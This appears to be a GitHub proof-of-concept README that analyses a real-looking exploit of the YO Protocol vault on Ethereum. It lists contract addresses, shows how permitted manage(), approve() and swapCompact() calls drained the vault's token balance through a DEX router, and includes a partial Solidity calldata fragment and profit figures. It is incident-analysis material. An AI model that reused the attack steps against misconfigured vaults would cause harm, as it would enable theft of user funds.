# YoProtocol-3.7M-PoC

## Summary

| **Protocol** - YO Protocol

| **Chain** - Ethereum Mainnet

| **Block** - 24218806

| **Attack Type** - Access Control Exploitation + Unauthorized Swap

| **Total Drained** - 3,840,651,397,502,403,762,632,376 tokens (~3.84e24)

| **Attacker Profit** - 16,825,758,092,977,224,691,385 tokens (~16.8e21)

| **Root Cause** - Misconfigured Access Control Permissions

---

An attacker exploited misconfigured access control permissions on the YO Protocol vault to drain approximately 3.84e24 yield-bearing tokens. The attacker leveraged their `canCall()` permissions to execute a `manage()` function call that approved and swapped the vault entire token balance through a DEX aggregator, extracting ~0.44% of the swapped amount as fees.

---

## Contracts

```
| **Vault (Proxy)** `0x0000000f2eB9f69274678c76222B35eEc7588a65`  (Victim - holds protocol funds)
| **Vault Implementation** `0xAAE23050e5BaD7f0024a0F73b8C890368AFf912D`  (Logic contract)
| **Access Control** `0x9524e25079b1b04D904865704783A5aA0202d44D`  (Permission management)
| **Drained Token** `0x1a88Df1cFe15Af22B3c4c783D4e6F7F9e0C1885d`  (Yield-bearing token)
| **Token Implementation** `0x50F9d4E28309303F0cdcAc8AF0b569e8b75Ab857`  (Token logic)
| **Swap Router** `0xCf5540fFFCdC3d510B18bFcA6d2b9987b0772559`  (DEX aggregator)
| **Path Executor** `0x365084B05Fa7d5028346bD21D842eD0601bAB5b8`  (Swap routing)
| **Uniswap V4** `0x000000000004444c5dc75cB358380D2e3dE08A90`  (Pool Manager)
| **Attacker** `0x5C28b54E7e1f9aafbdc5c563C1a460106f41Bd58`  (EOA with permissions)
```
---

## Analysis

### `manage()` Function

The vault exposes a `manage()` function that allows authorized callers to execute arbitrary calls on behalf of the vault:

```solidity
function manage(
    address[] calldata targets,
    bytes[] calldata calldatas,
    uint256[] calldata values
) external returns (bytes[] memory);
```

This function is protected by an access control check via `canCall()`:

```solidity
function canCall(
    address caller,    // Who is calling
    address target,    // Target contract
    bytes4 selector    // Function selector
) external view returns (bool);
```

<img width="1510" height="250" alt="image" src="https://github.com/user-attachments/assets/460362cc-a74c-4c74-822e-5ddabf7c57d4" />

The attacker address `0x5C28b54E7e1f9aafbdc5c563C1a460106f41Bd58` had the following permissions configured:

| Permission | Target | Selector | Status |
|------------|--------|----------|--------|
| `manage()` | Vault | `0x224d8703` | Allowed
| `approve()` | Token | `0x095ea7b3` | Allowed
| `swapCompact()` | Router | `0x83bd37f9` | Allowed

**Critical Issue**: The combination of these permissions allowed the attacker to:
1. Approve unlimited tokens to an external swap router
2. Execute arbitrary swaps that drain the vault
3. Receive fees based on `tx.origin` during swap execution


The swap router uses `tx.origin` to determine fee recipients. During multi-hop swaps through Uniswap V4, a percentage of tokens is sent to `tx.origin`:

```
Vault Tokens → Path Executor → Uniswap V4 Pools → USDC
                    ↓
              Fee to tx.origin (Attacker)
```

TX : https://app.blocksec.com/phalcon/explorer/tx/eth/0x6aff59e800dc219ff0d1614b3dc512e7a07159197b2a6a26969a9ca25c3e33b4

---

## Execution Flow

```
Step 1: Permission Verification                                             
┌──────────────────────────────────────────────────────────────────────┐   
│ AccessControl.canCall(attacker, vault, manage) → TRUE                │   
│ AccessControl.canCall(attacker, token, approve) → TRUE               │   
│ AccessControl.canCall(attacker, router, swapCompact) → TRUE          │   
└──────────────────────────────────────────────────────────────────────┘   
                                      ↓                                       
Step 2: Execute manage() with malicious calldata                          
┌──────────────────────────────────────────────────────────────────────┐   
│ vault.manage(                                                        │   
│   targets: [token, swapRouter],                                      │   
│   calldatas: [approve(...), swapCompact(...)],                       │   
│   values: [0, 0]                                                     │   
│ )                                                                    │   
└──────────────────────────────────────────────────────────────────────┘   
                                      ↓                                       
Step 3: Token Approval                                                      
┌──────────────────────────────────────────────────────────────────────┐   
│ token.approve(swapRouter, 3,840,651,397,502,403,762,632,376)         │   
│                           (3.84e24 tokens - entire balance)          │   
└──────────────────────────────────────────────────────────────────────┘   
                                      ↓                                       
Step 4: Swap Execution                                                      
┌──────────────────────────────────────────────────────────────────────┐   
│ swapRouter.swapCompact() executes:                                   │   
│   • transferFrom(vault → pathExecutor, 3.84e24 tokens)               │   
│   • Multi-hop swaps through Uniswap V4 pools                         │   
│   • Fee distribution to tx.origin (attacker)                         │   
│   • Final output: ~$112K USDC to vault                               │   
└──────────────────────────────────────────────────────────────────────┘   
                                      ↓                                       
Step 5: Profit Extraction                                                   
┌──────────────────────────────────────────────────────────────────────┐   
│ During swap execution, attacker receives:                            │   
│   • 16,825,758,092,977,224,691,385 tokens (~16.8e21)                 │   
│   • Approximately 0.44% of total swapped amount                      │   
└──────────────────────────────────────────────────────────────────────┘   
```

---

## Details

```solidity
// Attacker address
address attacker = 0x5C28b54E7e1f9aafbdc5c563C1a460106f41Bd58;

// Targets
address[] targets = [
    0x1a88Df1cFe15Af22B3c4c783D4e6F7F9e0C1885d,  // Token
    0xCf5540fFFCdC3d510B18bFcA6d2b9987b0772559   // Swap Router
];

// Calldata 1: approve(swapRouter, amount)
bytes approveCalldata = abi.encodeWithSelector(
    0x095ea7b3,  // approve selector
    0xCf5540fFFCdC3d510B18bFcA6d2b9987b0772559,
    3840651397502403762632376
);

// Calldata 2: swapCompact() with routing data
bytes swapCalldata = hex"83bd37f9..."; // routing data
```

### 5.2 Swap Routing

The `swapCompact()` calldata contains encoded routing instructions:

```
Input Token 0x1a88Df1cFe15Af22B3c4c783D4e6F7F9e0C1885d 
Output Token 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (USDC) 
Input Amount 3,840,651,397,502,403,762,632,376
Recipient 0x0000000f2eB9f69274678c76222B35eEc7588a65 (Vault) 
Path Executor 0x365084B05Fa7d5028346bD21D842eD0601bAB5b8
```

<img width="1572" height="189" alt="image" src="https://github.com/user-attachments/assets/896e47f5-f754-4261-b272-a951589f527a" />

---

### Results

```
Total Tokens Processed: 3,840,651,397,502,403,762,632,376
Attacker Profit:          16,825,758,092,977,224,691,385
Extraction Rate:          ~0.438%

Gas Used:    5,837,595
Gas Price:   ~0.11 gwei
Attack Cost: ~0.00064 ETH (~$2.30)
```

